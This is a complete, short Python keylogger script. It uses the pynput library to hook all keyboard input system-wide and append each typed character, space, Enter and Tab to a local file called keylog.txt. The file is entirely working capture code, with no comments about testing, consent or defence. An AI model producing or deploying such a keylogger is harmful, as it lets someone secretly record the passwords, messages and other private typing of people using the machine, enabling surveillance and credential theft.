from pynput import keyboard

LOG_FILE = "keylog.txt"

def format_key(key):
    try:
        # Normal character keys
        if key.char is not None:
            return key.char
        else:
            return ""   # strange cases such as ctrl+?
    except AttributeError:
        # Special keys (Enter, Space, etc.)
        if key == keyboard.Key.space:
            return " "
        elif key == keyboard.Key.enter:
            return "\n"
        elif key == keyboard.Key.tab:
            return "\t"
        else:
            return ""

def on_press(key):
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(format_key(key))

if __name__ == "__main__":
    # Start global listener
    listener = keyboard.Listener(on_press=on_press)
    listener.start()

    # Keep program running
    listener.join()